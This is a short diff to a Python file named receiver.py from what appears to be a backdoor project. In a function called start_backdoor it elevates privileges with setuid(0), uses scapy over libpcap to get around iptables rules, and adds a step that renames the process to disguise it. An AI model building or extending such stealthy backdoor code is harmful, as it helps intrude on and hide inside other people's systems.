@@ -15,15 +15,16 @@ receiver.py
 ----------------------------------------------------------------------------------------------------
 """
 
+import setproctitle
 import socket as sock
 # from socket import *
 from _thread import *
 from os import setuid, setgid
 
-from scapy.all import *
-from scapy.layers.inet import *
 import encryption
 import subprocess
+from scapy.all import *
+from scapy.layers.inet import *
 # Set scapy to use libpcap library to circumvent iptables rules.
 from scapy.all import conf
 conf.use_pcap = True
@@ -104,6 +105,11 @@ def start_backdoor():
     # Elevate privileges.
     setuid(0)
     setgid(0)
+
+    # Change process name
+    setproctitle.setproctitle("Super Secret Process")
+    u_input = input()
+    return
 
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
